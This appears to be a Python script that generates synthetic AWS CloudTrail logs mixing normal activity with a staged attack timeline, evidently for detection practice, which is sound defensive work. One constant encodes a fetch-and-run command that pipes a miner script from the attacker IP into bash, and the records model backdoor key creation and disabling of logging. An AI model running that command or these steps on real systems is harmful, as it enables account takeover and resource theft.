#!/usr/bin/env python3
# Author: Jay Patel
"""
CloudTrail Attack Log Generator — creates a realistic synthetic CloudTrail
log file that simulates four attack scenarios against a fictional AWS account:

  1. S3 bucket enumeration + data exfiltration (public bucket misconfiguration)
  2. IAM enumeration using stolen dev credentials
  3. IAM role hijacking + persistent backdoor access key creation
  4. Cryptomining EC2 deployment (p3.16xlarge, non-standard region)
  5. Defense evasion: StopLogging + DeleteTrail attempt

Optionally uploads the generated log file to a LocalStack or real AWS S3 bucket
to simulate the CloudTrail delivery path.

Usage:
  python generate_attack_logs.py --output ../sample_data/cloudtrail_logs.json
  python generate_attack_logs.py --output /tmp/ct.json --upload-localstack
  python generate_attack_logs.py --output /tmp/ct.json --upload-s3 my-cloudtrail-bucket
"""

import argparse
import base64
import gzip
import json
import logging
import os
import random
import string
import sys
import uuid
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%Y-%m-%dT%H:%M:%S",
)
log = logging.getLogger(__name__)

# ─── Account constants ────────────────────────────────────────────────────────
ACCOUNT_ID = "123456789012"
ATTACKER_IP = "185.220.101.47"   # Tor exit node
CORP_IPS = ["72.21.198.44", "72.21.198.52", "72.21.198.78"]
SVC_IP = "54.240.196.10"

# Base date: attack happens at 02:xx UTC on this day
BASE_DATE = datetime(2024, 3, 15, tzinfo=timezone.utc)
BUSINESS_START = timedelta(hours=9)
ATTACK_START = timedelta(hours=2, minutes=14)

# Crypto miner payload (harmless base64 placeholder)
MINER_PAYLOAD = base64.b64encode(b"#!/bin/bash\ncurl -s http://185.220.101.47/xmrig.sh | bash").decode()


def _uid(prefix: str = "") -> str:
    """Generate a fake but realistic-looking AWS request/event ID."""
    return prefix + str(uuid.uuid4())


def _ts(base: datetime, delta: timedelta) -> str:
    """Return an ISO-8601 UTC timestamp string."""
    return (base + delta).strftime("%Y-%m-%dT%H:%M:%SZ")


def _record(
    event_time: str,
    event_source: str,
    event_name: str,
    region: str,
    source_ip: str,
    user_agent: str,
    user_identity: Dict[str, Any],
    request_params: Dict[str, Any],
    response_elements: Any = None,
    error_code: str = None,
    error_message: str = None,
) -> Dict[str, Any]:
    """Assemble one CloudTrail record dict."""
    rec: Dict[str, Any] = {
        "eventVersion": "1.08",
        "userIdentity": user_identity,
        "eventTime": event_time,
        "eventSource": event_source,
        "eventName": event_name,
        "awsRegion": region,
        "sourceIPAddress": source_ip,
        "userAgent": user_agent,
        "requestParameters": request_params,
        "responseElements": response_elements,
        "errorCode": error_code,
        "errorMessage": error_message,
        "requestID": "".join(random.choices(string.hexdigits.upper(), k=16)),
        "eventID": str(uuid.uuid4()),
        "eventType": "AwsApiCall",
        "recipientAccountId": ACCOUNT_ID,
    }
    return rec


# ─── Identity helpers ─────────────────────────────────────────────────────────

def _iam_identity(username: str, principal_id: str) -> Dict[str, Any]:
    return {
        "type": "IAMUser",
        "principalId": principal_id,
        "arn": f"arn:aws:iam::{ACCOUNT_ID}:user/{username}",
        "accountId": ACCOUNT_ID,
        "userName": username,
    }


def _assumed_role_identity(role_name: str, session_name: str) -> Dict[str, Any]:
    principal_id = f"AROAIOSFODNN7{role_name[:6].upper()}:{session_name}"
    return {
        "type": "AssumedRole",
        "principalId": principal_id,
        "arn": f"arn:aws:sts::{ACCOUNT_ID}:assumed-role/{role_name}/{session_name}",
        "accountId": ACCOUNT_ID,
        "sessionContext": {
            "sessionIssuer": {
                "type": "Role",
                "principalId": f"AROAIOSFODNN7{role_name[:6].upper()}",
                "arn": f"arn:aws:iam::{ACCOUNT_ID}:role/{role_name}",
                "accountId": ACCOUNT_ID,
                "userName": role_name,
            }
        },
    }


def _unknown_identity() -> Dict[str, Any]:
    return {
        "type": "AWSAccount",
        "principalId": "AROAIOSFODNN7ATTK01",
        "arn": f"arn:aws:sts::{ACCOUNT_ID}:assumed-role/unauthenticated-role/session",
        "accountId": ACCOUNT_ID,
        "userName": "unknown",
    }


# ─── Normal baseline traffic ──────────────────────────────────────────────────

def build_normal_traffic() -> List[Dict[str, Any]]:
    """Generate ~15 legitimate API calls during business hours."""
    records = []
    alice = _iam_identity("alice.johnson", "AIDAIOSFODNN7ALICE01")
    bob = _iam_identity("bob.smith", "AIDAIOSFODNN7BOB001")
    david = _iam_identity("david.chen", "AIDAIOSFODNN7DAVID1")
    svc = _iam_identity("svc-ci-deploy", "AIDAIOSFODNN7SVC001")

    # alice.johnson — S3 reads + EC2 describe
    normal_events = [
        (BUSINESS_START + timedelta(minutes=2),  "s3.amazonaws.com", "GetObject",
         "us-east-1", CORP_IPS[0], alice, "aws-cli/2.15.12 Python/3.11.6",
         {"bucketName": "company-data", "key": "reports/weekly-summary.pdf"}),

        (BUSINESS_START + timedelta(minutes=28), "ec2.amazonaws.com", "DescribeInstances",
         "us-east-1", CORP_IPS[0], alice, "aws-cli/2.15.12 Python/3.11.6",
         {"filterSet": {}}),

        (BUSINESS_START + timedelta(minutes=65), "s3.amazonaws.com", "PutObject",
         "us-east-1", CORP_IPS[0], alice, "aws-cli/2.15.12 Python/3.11.6",
         {"bucketName": "company-data", "key": "uploads/q1-report-final.pdf"}),

        (BUSINESS_START + timedelta(minutes=151), "monitoring.amazonaws.com", "GetMetricData",
         "us-east-1", CORP_IPS[0], alice, "aws-sdk-python/1.34.0",
         {"namespace": "AWS/EC2"}),

        # bob.smith — S3 + CloudWatch
        (BUSINESS_START + timedelta(minutes=43), "s3.amazonaws.com", "GetObject",
         "us-east-1", CORP_IPS[1], bob, "Mozilla/5.0 (compatible; aws-console)",
         {"bucketName": "company-logs", "key": "app/2024-03-14.log"}),

        (BUSINESS_START + timedelta(minutes=87), "s3.amazonaws.com", "PutObject",
         "us-east-1", CORP_IPS[1], bob, "aws-cli/2.15.12 Python/3.11.6",
         {"bucketName": "company-data", "key": "backups/db-snapshot-20240315.sql.gz"}),

        (BUSINESS_START + timedelta(minutes=222), "monitoring.amazonaws.com", "GetMetricData",
         "us-east-1", CORP_IPS[1], bob, "aws-sdk-python/1.34.0",
         {"namespace": "AWS/S3"}),

        # svc-ci-deploy — EC2 lifecycle (legit t3.micro)
        (BUSINESS_START + timedelta(minutes=120), "ec2.amazonaws.com", "RunInstances",
         "us-east-1", SVC_IP, svc, "terraform/1.7.0",
         {"instanceType": "t3.micro", "imageId": "ami-0c02fb55956c7d316", "minCount": 1, "maxCount": 1}),

        (BUSINESS_START + timedelta(minutes=128), "ec2.amazonaws.com", "TerminateInstances",
         "us-east-1", SVC_IP, svc, "terraform/1.7.0",
         {"instancesSet": {"items": [{"instanceId": "i-0a1b2c3d4e5f6a7b8"}]}}),

        # david.chen — IAM + CloudTrail reads
        (BUSINESS_START + timedelta(minutes=305), "iam.amazonaws.com", "GetUser",
         "us-east-1", CORP_IPS[2], david, "aws-cli/2.15.12 Python/3.11.6",
         {"userName": "david.chen"}),

        (BUSINESS_START + timedelta(minutes=378), "cloudtrail.amazonaws.com", "GetTrailStatus",
         "us-east-1", CORP_IPS[2], david, "aws-cli/2.15.12 Python/3.11.6",
         {"name": "management-events-trail"}),

        (BUSINESS_START + timedelta(minutes=415), "s3.amazonaws.com", "GetObject",
         "us-east-1", CORP_IPS[0], alice, "aws-cli/2.15.12 Python/3.11.6",
         {"bucketName": "company-data", "key": "presentations/board-deck-2024.pptx"}),

        (BUSINESS_START + timedelta(minutes=450), "s3.amazonaws.com", "GetObject",
         "us-east-1", CORP_IPS[1], bob, "aws-cli/2.15.12 Python/3.11.6",
         {"bucketName": "company-logs", "key": "app/2024-03-15.log"}),

        (BUSINESS_START + timedelta(minutes=475), "iam.amazonaws.com", "ListRoles",
         "us-east-1", CORP_IPS[2], david, "aws-cli/2.15.12 Python/3.11.6",
         {}),
    ]

    for delta, src, name, region, ip, identity, ua, params in normal_events:
        records.append(_record(
            event_time=_ts(BASE_DATE, delta),
            event_source=src,
            event_name=name,
            region=region,
            source_ip=ip,
            user_agent=ua,
            user_identity=identity,
            request_params=params,
        ))

    return records


# ─── Attack scenario records ──────────────────────────────────────────────────

def build_attack_traffic() -> List[Dict[str, Any]]:
    """Generate the full attack sequence from ATTACKER_IP."""
    records: List[Dict[str, Any]] = []
    ua_anon = "python-requests/2.31.0"
    ua_boto = "boto3/1.34.0 Python/3.11.0 Linux/6.1"
    t = ATTACK_START
    dev_identity = _iam_identity("dev-temp", "AIDAIOSFODNN7DEV001")
    role_identity = _assumed_role_identity("ec2-admin-role", "maintenance-session-1710461880")

    # ── Phase 1: Unauthenticated S3 Enumeration (T1580) ──────────────────────
    log.info("  Building Phase 1: S3 bucket enumeration")

    records.append(_record(
        _ts(BASE_DATE, t), "s3.amazonaws.com", "ListBuckets", "us-east-1",
        ATTACKER_IP, ua_anon, _unknown_identity(), {},
        error_code="AccessDenied", error_message="Access Denied",
    ))
    t += timedelta(seconds=12)

    for bucket, ok in [("company-data", False), ("company-logs", False), ("company-public-assets", True)]:
        records.append(_record(
            _ts(BASE_DATE, t), "s3.amazonaws.com", "GetBucketAcl", "us-east-1",
            ATTACKER_IP, ua_anon, _unknown_identity(), {"bucketName": bucket},
            error_code=None if ok else "AccessDenied",
            error_message=None if ok else "Access Denied",
        ))
        t += timedelta(seconds=12)

    records.append(_record(
        _ts(BASE_DATE, t), "s3.amazonaws.com", "ListObjects", "us-east-1",
        ATTACKER_IP, ua_anon, _unknown_identity(), {"bucketName": "company-public-assets"},
    ))
    t += timedelta(seconds=14)

    # ── Phase 2: Data Exfiltration from misconfigured bucket (T1530) ─────────
    log.info("  Building Phase 2: Data exfiltration")

    for obj_key in [
        "internal/hr-export-2024.csv",
        "internal/salary-data-2024.xlsx",
        "configs/db-config.json",
    ]:
        records.append(_record(
            _ts(BASE_DATE, t), "s3.amazonaws.com", "GetObject", "us-east-1",
            ATTACKER_IP, ua_anon, _unknown_identity(),
            {"bucketName": "company-public-assets", "key": obj_key},
        ))
        t += timedelta(seconds=13)

    # ── Phase 3: IAM Enumeration with stolen dev creds (T1087.004) ───────────
    log.info("  Building Phase 3: IAM enumeration with stolen credentials")
    t += timedelta(seconds=19)  # pause — switches to stolen key

    records.append(_record(
        _ts(BASE_DATE, t), "s3.amazonaws.com", "ListBuckets", "us-east-1",
        ATTACKER_IP, ua_boto, dev_identity, {},
    ))
    t += timedelta(seconds=15)

    for obj_key in ["finance/Q4-2023-results.xlsx", "hr/employee-records-full.csv"]:
        records.append(_record(
            _ts(BASE_DATE, t), "s3.amazonaws.com", "GetObject", "us-east-1",
            ATTACKER_IP, ua_boto, dev_identity,
            {"bucketName": "company-data", "key": obj_key},
        ))
        t += timedelta(seconds=15)

    records.append(_record(
        _ts(BASE_DATE, t), "iam.amazonaws.com", "ListUsers", "us-east-1",
        ATTACKER_IP, ua_boto, dev_identity, {},
    ))
    t += timedelta(seconds=15)

    records.append(_record(
        _ts(BASE_DATE, t), "iam.amazonaws.com", "ListRoles", "us-east-1",
        ATTACKER_IP, ua_boto, dev_identity, {},
    ))
    t += timedelta(seconds=15)

    records.append(_record(
        _ts(BASE_DATE, t), "iam.amazonaws.com", "GetUser", "us-east-1",
        ATTACKER_IP, ua_boto, dev_identity, {"userName": "admin-user"},
    ))
    t += timedelta(seconds=30)

    # ── Phase 4: AssumeRole + persistence (T1078.004, T1098.001) ─────────────
    log.info("  Building Phase 4: AssumeRole + backdoor key creation")

    records.append(_record(
        _ts(BASE_DATE, t), "sts.amazonaws.com", "AssumeRole", "us-east-1",
        ATTACKER_IP, ua_boto, dev_identity,
        {
            "roleArn": f"arn:aws:iam::{ACCOUNT_ID}:role/ec2-admin-role",
            "roleSessionName": "maintenance-session-1710461880",
        },
        response_elements={
            "credentials": {
                "accessKeyId": "ASIAIOSFODNN7EXAMPLE",
                "expiration": "2024-03-15T10:18:00Z",
            }
        },
    ))
    t += timedelta(seconds=30)

    records.append(_record(
        _ts(BASE_DATE, t), "iam.amazonaws.com", "CreateAccessKey", "us-east-1",
        ATTACKER_IP, ua_boto, dev_identity, {"userName": "dev-temp"},
        response_elements={
            "accessKey": {
                "accessKeyId": "AKIAIOSFODNN7PERSIST",
                "status": "Active",
                "userName": "dev-temp",
            }
        },
    ))
    t += timedelta(minutes=1, seconds=30)

    # ── Phase 5: Cryptomining EC2 in non-standard region (T1496) ─────────────
    log.info("  Building Phase 5: Cryptomining EC2 deployment (ap-southeast-1)")

    records.append(_record(
        _ts(BASE_DATE, t), "ec2.amazonaws.com", "DescribeInstances", "ap-southeast-1",
        ATTACKER_IP, ua_boto, role_identity, {"filterSet": {}},
    ))
    t += timedelta(minutes=1)

    records.append(_record(
        _ts(BASE_DATE, t), "ec2.amazonaws.com", "RunInstances", "ap-southeast-1",
        ATTACKER_IP, ua_boto, role_identity,
        {
            "instanceType": "p3.16xlarge",
            "imageId": "ami-0abcdef1234567890",
            "minCount": 4,
            "maxCount": 4,
            "userData": MINER_PAYLOAD,
        },
        response_elements={
            "instancesSet": {
                "items": [{"instanceId": f"i-0deadbeef{i:04d}aaaa"} for i in range(1, 5)]
            }
        },
    ))
    t += timedelta(minutes=1)

    records.append(_record(
        _ts(BASE_DATE, t), "ec2.amazonaws.com", "CreateSecurityGroup", "ap-southeast-1",
        ATTACKER_IP, ua_boto, role_identity,
        {"groupName": "default-maintenance-sg", "groupDescription": "Maintenance group",
         "vpcId": "vpc-0a1b2c3d4e5f6a7b8"},
        response_elements={"groupId": "sg-0a1b2c3d4e5f6aaaa"},
    ))
    t += timedelta(minutes=1)

    # ── Phase 6: Defense Evasion (T1562.008) ──────────────────────────────────
    log.info("  Building Phase 6: Defense evasion — StopLogging + DeleteTrail")

    records.append(_record(
        _ts(BASE_DATE, t), "s3.amazonaws.com", "PutBucketPolicy", "us-east-1",
        ATTACKER_IP, ua_boto, role_identity,
        {
            "bucketName": "company-data",
            "policy": json.dumps({
                "Version": "2012-10-17",
                "Statement": [{
                    "Effect": "Allow", "Principal": "*",
                    "Action": "s3:GetObject",
                    "Resource": "arn:aws:s3:::company-data/*",
                }],
            }),
        },
    ))
    t += timedelta(minutes=3)

    records.append(_record(
        _ts(BASE_DATE, t), "cloudtrail.amazonaws.com", "StopLogging", "us-east-1",
        ATTACKER_IP, ua_boto, role_identity,
        {"name": "management-events-trail"},
    ))
    t += timedelta(minutes=3)

    records.append(_record(
        _ts(BASE_DATE, t), "cloudtrail.amazonaws.com", "DeleteTrail", "us-east-1",
        ATTACKER_IP, ua_boto, role_identity,
        {"name": "management-events-trail"},
        error_code="AccessDenied", error_message="Access Denied",
    ))

    return records


def upload_to_s3(records: List[Dict[str, Any]], bucket: str, endpoint_url: str = None) -> None:
    """Upload generated logs to S3 (real or LocalStack) in CloudTrail format."""
    try:
        import boto3
    except ImportError:
        log.error("boto3 required for S3 upload: pip install boto3")
        sys.exit(1)

    import io

    kwargs = dict(
        aws_access_key_id=os.environ.get("AWS_ACCESS_KEY_ID", "test"),
        aws_secret_access_key=os.environ.get("AWS_SECRET_ACCESS_KEY", "test"),
        region_name=os.environ.get("AWS_REGION", "us-east-1"),
    )
    if endpoint_url:
        kwargs["endpoint_url"] = endpoint_url

    s3 = boto3.client("s3", **kwargs)

    # Ensure bucket exists (LocalStack)
    try:
        s3.create_bucket(Bucket=bucket)
    except Exception:
        pass  # bucket already exists

    payload = json.dumps({"Records": records}, indent=2)
    compressed = gzip.compress(payload.encode())

    key = (
        f"AWSLogs/{ACCOUNT_ID}/CloudTrail/us-east-1/"
        f"{BASE_DATE.strftime('%Y/%m/%d')}/"
        f"{ACCOUNT_ID}_CloudTrail_us-east-1_"
        f"{BASE_DATE.strftime('%Y%m%dT%H%MZ')}_attack-simulation.json.gz"
    )

    s3.put_object(Bucket=bucket, Key=key, Body=compressed)
    log.info(f"✓ Uploaded {len(compressed):,} bytes to s3://{bucket}/{key}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Generate synthetic CloudTrail attack logs"
    )
    parser.add_argument(
        "--output", metavar="FILE", required=True,
        help="Path to write the JSON log file",
    )
    parser.add_argument(
        "--upload-localstack", action="store_true",
        help="Also upload to LocalStack (http://localhost:4566)",
    )
    parser.add_argument(
        "--upload-s3", metavar="BUCKET",
        help="Also upload to a real AWS S3 bucket",
    )
    parser.add_argument(
        "--s3-bucket", metavar="BUCKET", default="cloudtrail-logs",
        help="S3 bucket name when using --upload-localstack (default: cloudtrail-logs)",
    )
    args = parser.parse_args()

    log.info("Generating synthetic CloudTrail attack scenario logs...")
    normal = build_normal_traffic()
    attack = build_attack_traffic()

    all_records = sorted(normal + attack, key=lambda r: r["eventTime"])
    log.info(f"Generated {len(normal)} normal + {len(attack)} attack records = {len(all_records)} total")

    output = {"Records": all_records}
    with open(args.output, "w") as f:
        json.dump(output, f, indent=2)
    log.info(f"✓ Written to {args.output}")

    if args.upload_localstack:
        upload_to_s3(all_records, args.s3_bucket, endpoint_url="http://localhost:4566")

    if args.upload_s3:
        upload_to_s3(all_records, args.upload_s3)

    print(f"\n✓ Done — {len(all_records)} CloudTrail records written to {args.output}")
    print(f"  Attacker IP  : {ATTACKER_IP}")
    print(f"  Attack window: {_ts(BASE_DATE, ATTACK_START)} → {_ts(BASE_DATE, ATTACK_START + timedelta(minutes=14))}")
    print(f"  Normal window: {_ts(BASE_DATE, BUSINESS_START)} → {_ts(BASE_DATE, BUSINESS_START + timedelta(hours=8))}")


if __name__ == "__main__":
    main()
